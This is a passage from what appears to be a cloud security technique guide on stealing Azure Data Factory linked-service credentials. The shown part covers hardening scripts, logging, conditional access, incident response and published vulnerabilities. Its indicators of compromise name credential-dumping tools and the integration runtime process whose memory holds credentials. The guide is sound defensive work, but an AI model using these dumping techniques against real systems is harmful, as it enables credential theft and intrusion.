foreach ($service in $linkedServices) {
    $json = $service.Properties | ConvertTo-Json
    if ($json -match "https://.*vault.azure.net") {
        Write-Host "$($service.Name): ✓ Uses Key Vault reference" -ForegroundColor Green
    } else {
        Write-Host "$($service.Name): ✗ Contains hardcoded credential" -ForegroundColor Red
    }
}
```

**Expected Output (If Secure):**
```
SQL_Production_DB: ✓ Uses Key Vault reference
CosmosDB_Analytics: ✓ Uses Key Vault reference
StorageAccount_DataLake: ✓ Uses Key Vault reference
```

---

### Priority 2: HIGH

**3. Restrict Integration Runtime Network Access**

**Applies To Versions:** Self-Hosted Integration Runtime on Windows Server 2016-2025, Linux

**Concept:** Isolate self-hosted integration runtimes to specific subnets and use network security groups (NSGs) to block unauthorized access to the process and configuration files.

**Manual Steps (Azure Portal):**

1. Identify the VM(s) hosting Self-Hosted IR:
   - **Azure Portal** → **Virtual Machines** → Select IR VM
   - Note the **Network Interface** (NIC) and **Resource Group**

2. Create or update Network Security Group (NSG):
   - **Azure Portal** → **Network Security Groups** → Click **Create** (if new)
   - **Name:** `ir-security-nsg`
   - Associate with the IR VM's subnet

3. Configure inbound rules:
   - Click **Inbound security rules** → **Add**
   - **Source:** Limit to authorized Data Factory management subnets only
   - **Destination:** IR VM subnet
   - **Protocol:** TCP
   - **Port Ranges:** 8060 (default IR gateway port), 443 (HTTPS)
   - **Action:** Allow
   - Click **Add**
   - **Block all other inbound traffic** (set default rule to Deny)

4. Configure outbound rules:
   - Click **Outbound security rules** → **Add**
   - **Destination:** Only Azure control plane IPs and approved data sources
   - **Ports:** 443 (HTTPS to Azure), 1433 (SQL), 5432 (PostgreSQL), etc. (as needed)
   - **Action:** Allow
   - Block unauthorized exfiltration channels

**Manual Steps (PowerShell):**

```powershell
# Create NSG
$nsgName = "ir-security-nsg"
$resourceGroupName = "your-rg"
$nsg = New-AzNetworkSecurityGroup -Name $nsgName -ResourceGroupName $resourceGroupName -Location "eastus"

# Add inbound rule (restrict to authorized management subnet only)
$rule = New-AzNetworkSecurityRuleConfig -Name "AllowADFManagement" `
    -Direction Inbound `
    -Priority 100 `
    -Protocol Tcp `
    -SourcePortRange "*" `
    -DestinationPortRange "8060" `
    -SourceAddressPrefix "203.0.113.0/24" `  # Replace with authorized subnet CIDR
    -DestinationAddressPrefix "*" `
    -Access Allow

Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -InputObject $rule | Set-AzNetworkSecurityGroup

# Add outbound rule (block unnecessary outbound traffic)
$outboundRule = New-AzNetworkSecurityRuleConfig -Name "DenyUnauthorizedExfiltration" `
    -Direction Outbound `
    -Priority 4096 `
    -Protocol "*" `
    -SourcePortRange "*" `
    -DestinationPortRange "*" `
    -SourceAddressPrefix "*" `
    -DestinationAddressPrefix "0.0.0.0/0" `
    -Access Deny

Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -InputObject $outboundRule | Set-AzNetworkSecurityGroup

# Associate NSG with IR VM's NIC
$vmName = "ir-vm-name"
$vm = Get-AzVM -Name $vmName -ResourceGroupName $resourceGroupName
$nic = Get-AzNetworkInterface -ResourceGroupName $resourceGroupName -Name $vm.NetworkProfile.NetworkInterfaces[0].Id.Split("/")[-1]
$nic.NetworkSecurityGroup = $nsg
Set-AzNetworkInterface -NetworkInterface $nic
```

**Validation Command:**

```powershell
# Verify NSG is applied and allows only necessary ports
Get-AzNetworkSecurityGroup -Name $nsgName -ResourceGroupName $resourceGroupName | Get-AzNetworkSecurityRuleConfig | Select-Object Name, Access, Direction, DestinationPortRange
```

---

**4. Enable Audit Logging for Linked Service Access**

**Applies To Versions:** Azure Data Factory v2 (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Monitor** → **Diagnostic Settings**
2. Select your Data Factory resource
3. Click **Add Diagnostic Setting**
4. **Name:** `adf-audit-log`
5. Under **Logs**, enable:
   - ✓ `PipelineRuns`
   - ✓ `ActivityRuns`
   - ✓ `TriggerRuns`
6. Under **Destinations**, select:
   - ✓ Send to Log Analytics workspace
   - ✓ Archive to storage account (for long-term retention)
7. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Enable diagnostic logging for Data Factory
$adfResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.DataFactory/factories/{adfName}"
$workspaceResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/microsoft.operationalinsights/workspaces/{workspaceName}"

New-AzDiagnosticSetting -Name "adf-audit-log" `
    -ResourceId $adfResourceId `
    -WorkspaceId $workspaceResourceId `
    -EnableLogCategory "PipelineRuns", "ActivityRuns", "TriggerRuns"
```

---

### Priority 3: MEDIUM

**5. Implement Conditional Access Policies**

**Applies To Versions:** Azure Data Factory v2 (with Entra ID integration), Azure Synapse

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New Policy**
3. **Name:** `Data Factory High-Risk Activity Protection`
4. **Assignments:**
   - **Users:** All users with Data Factory access
   - **Cloud apps:** Azure Data Factory
5. **Conditions:**
   - **Locations:** Trusted corporate networks only
   - **Device state:** Compliant or marked as secure
   - **Sign-in risk:** Medium or High
6. **Access Controls:**
   - **Grant:** Require multi-factor authentication
   - **OR Require device to be marked as compliant**
7. **Enable policy:** ON
8. Click **Create**

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Memory dump files created in unusual locations: `C:\Windows\Temp\*.dmp`, `/tmp/*.bin`, `/tmp/*.core`
- Configuration backup files: `*.json.backup`, `LinkedServices.bak`
- Credential logs: `*credentials.txt`, `*secrets.csv`

**Process & Memory:**
- Suspicious process dump activities: `procdump64.exe`, `jmap`, `gdb` execution
- Mimikatz process execution or DLL injection
- Unusual memory access patterns on `diahost.exe` (IR process)

**Network:**
- Outbound connections from Integration Runtime VM to non-approved SQL, Cosmos DB, or Storage Account IPs
- Large data exfiltration from integration runtime VM (>1 GB in 1 hour)
- SSH/RDP connections to IR VMs from unexpected IP ranges

**Cloud Logs:**
- Unusual Cosmos DB/SQL queries from non-standard client IPs or user agents
- Authentication attempts using stolen service principal credentials
- Bulk data downloads from Storage Accounts using extracted SAS tokens

### Forensic Artifacts

**Disk:**
- Integration Runtime configuration files: `C:\Program Files\Microsoft Integration Runtime\Common\diaHostConfig.xml`
- IR gateway configuration: `C:\Program Files\Microsoft Integration Runtime\Gateway\GatewayConfig.xml`
- Process memory dumps: Search `C:\Windows\Temp\`, `/tmp/`

**Memory:**
- LSASS memory (if IR running under Local System): Look for plaintext credentials
- `diahost.exe` process memory: Contains credentials for all linked services

**Cloud Logs:**
- Azure Activity Log: Filter for `Microsoft.DataFactory/factories/integrationRuntimes` access
- Azure Synapse Audit Logs: Filter for credential usage or pipeline execution
- Application Insights: Integration Runtime application logs showing unusual database connections

**Azure Storage:**
- Integration Runtime diagnostic logs (if enabled): Check Azure Storage for logs containing credential references
- Azure Data Factory pipeline execution logs: Check for failed connections indicating credential testing

### Response Procedures

**1. Isolate and Contain:**

```bash
# Immediately disable compromised Self-Hosted Integration Runtime
az datafactory integration-runtime delete --factory-name <adf-name> --integration-runtime-name <ir-name> --resource-group <rg-name> --yes

# OR disable access to the IR VM
az vm deallocate --resource-group <rg-name> --name <ir-vm-name> --no-wait

# Block the Integration Runtime from starting:
Stop-Service "DIAHost" -Force -ErrorAction SilentlyContinue
Set-Service "DIAHost" -StartupType Disabled
```

**2. Revoke All Credentials:**

```powershell
# Rotate all linked service credentials in Key Vault
$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName

foreach ($service in $linkedServices) {
    # For each linked service, rotate the associated credentials:
    # - SQL: ALTER LOGIN user WITH PASSWORD = 'NewComplexPassword123!@#'
    # - Cosmos DB: Rotate connection strings in portal
    # - Storage Account: Regenerate access keys
    # - Event Hubs: Regenerate shared access keys
    
    # Update Key Vault with new credentials
    # (Manual process per service)
}

# Regenerate integration runtime auth keys
$authKeys = Get-AzDataFactoryV2IntegrationRuntimeKey -ResourceGroupName $resourceGroupName -DataFactoryName $adfName -IntegrationRuntimeName <ir-name>
# New auth key is automatically generated; old key is invalidated
```

**3. Investigate:**

```powershell
# Audit all linked services for unexpected changes
Get-AzActivityLog -ResourceGroupName $resourceGroupName -ResourceType "Microsoft.DataFactory/factories/linkedServices" -StartTime (Get-Date).AddDays(-7)

# Check for unusual SQL/Cosmos DB query patterns
# (Requires SQL Auditing or Cosmos DB diagnostic logs enabled)

# Export Activity Log for forensic analysis
Get-AzActivityLog -ResourceGroupName $resourceGroupName -StartTime (Get-Date).AddDays(-30) | Export-Csv -Path activity_log.csv
```

**4. Remediate:**

```powershell
# Delete compromised integration runtime and redeploy with hardened configuration
Remove-AzDataFactoryV2IntegrationRuntime -ResourceGroupName $resourceGroupName -DataFactoryName $adfName -Name <ir-name>

# Recreate with all credentials stored in Key Vault
New-AzDataFactoryV2IntegrationRuntime -ResourceGroupName $resourceGroupName -DataFactoryName $adfName -Name <ir-name-new> -Type SelfHosted
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy exploitation | Attacker gains initial foothold via exposed proxy endpoint |
| **2** | **Privilege Escalation** | [PE-ENTRA-012] Tenant Admin role assumption | Attacker escalates to Data Factory contributor permissions |
| **3** | **Lateral Movement (Current)** | **[LM-AUTH-034]** | **Data Factory credential reuse - extract linked service credentials** |
| **4** | **Resource Access** | [LM-AUTH-036] CosmosDB Connection String Reuse | Attacker uses extracted CosmosDB credentials to access analytics database |
| **5** | **Data Exfiltration** | [EXFIL-001] Bulk data download via stolen credentials | Attacker exports sensitive data using compromised SQL/Cosmos credentials |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: SynLapse Vulnerability (CVE-2022-29972) - Orca Security Research

- **Target Sector:** Financial Services, SaaS companies using Azure Synapse Analytics
- **Timeline:** May 2022 - Vulnerability disclosed; Microsoft patched April 15, 2022
- **Technique Status:** FIXED in April 15, 2022 patch; earlier versions vulnerable
- **Attack Details:** 
  - Attacker exploited ODBC connector flaw in Integration Runtime
  - Gained code execution within Synapse pipeline execution environment
  - Dumped process memory to extract plaintext credentials for customer databases
  - Accessed multiple customer accounts' SQL databases, Cosmos DB accounts, and storage accounts
  - No authentication needed; tenant separation bypass enabled cross-customer access
- **Impact:** 
  - Multi-tenant credential leakage affecting all Synapse/Data Factory customers
  - Attacker could leak customer credentials to external data sources
  - Attacker could execute arbitrary code on integration runtime VMs
  - Attacker could control other customers' Synapse workspaces
- **Reference:** [SynLapse: Critical Azure Synapse Vulnerability - Orca Security](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)

### Example 2: Azure Data Factory Apache Airflow Vulnerabilities - Unit 42 (Palo Alto Networks)

- **Target Sector:** Data engineering teams using Azure Data Factory with Apache Airflow
- **Timeline:** December 2024 - Vulnerabilities disclosed
- **Technique Status:** ACTIVE - Variants still possible in improperly configured Airflow clusters
- **Attack Details:**
  - Attacker gained write access to DAG files in Azure Storage (via leaked SAS token)
  - Modified data pipeline DAG to include reverse shell payload
  - DAG executed with service account credentials mounted in Kubernetes pod
  - Extracted environment variables containing Airflow database passwords, API keys, service account tokens
  - Used extracted SAS tokens to Event Hubs to exfiltrate logs and maintain persistence
  - Escalated from Kubernetes pod to cluster-wide admin access via RBAC misconfiguration
- **Impact:**
  - Shadow admin control over entire Airflow cluster
  - Data exfiltration of all connected data sources
  - Persistent backdoor access via compromised workload identities
- **Reference:** [Azure Data Factory Airflow Vulnerabilities - Unit 42](https://unit42.paloaltonetworks.com/azure-data-factory-apache-airflow-vulnerabilities/)

### Example 3: Credential Leakage via Git Repository - Common Misconfiguration

- **Target Sector:** Startups and rapidly scaling companies with DevOps teams
- **Timeline:** Ongoing - Common in CI/CD pipelines
- **Technique Status:** ACTIVE - Preventable through secrets scanning
- **Attack Details:**
  - Developer accidentally commits ARM template or pipeline definition to GitHub with embedded credentials
  - GitHub secret scanning may catch it, but private repos often lack monitoring
  - Attacker forks repo or uses GitHub dorking to find exposed credentials
  - Attacker uses stolen connection strings to access production databases
  - Attacker creates new IAM roles using stolen service principal credentials
  - Lateral movement to other resources via role assumption
- **Impact:**
  - Full access to production data stores
  - Potential for data exfiltration or ransomware deployment
- **Mitigation:** Implement pre-commit hooks, GitGuardian scanning, and enforce Key Vault references in code

---

## 10. REFERENCES & PROOF OF CONCEPT

### Official Microsoft Documentation
- [Azure Data Factory Linked Services Security Considerations](https://learn.microsoft.com/en-us/azure/data-factory/data-movement-security-considerations)
- [Secure Credential Management for ETL Workloads](https://azure.microsoft.com/en-us/blog/secure-credential-management-for-etl-workloads-using-azure-data-factory-and-azure-key-vault/)
- [Azure Synapse Analytics Security Best Practices](https://learn.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-access-control-overview)

### Security Research & Advisories
- [SynLapse - Orca Security Research](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)
- [Azure Data Factory Airflow Vulnerabilities - Unit 42](https://unit42.paloaltonetworks.com/azure-data-factory-apache-airflow-vulnerabilities/)
- [Azure Lateral Movement Techniques - XM Cyber](https://xmcyber.com/blog/privilege-escalation-and-lateral-movement-on-azure-part-1/)
- [Lateral Movement in Hybrid Environments - Datadog](https://www.datadoghq.com/blog/lateral-movement-entra-id-azure/)

### MITRE ATT&CK Reference
- [T1550: Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [T1550.001: Application Access Token](https://attack.mitre.org/techniques/T1550/001/)

---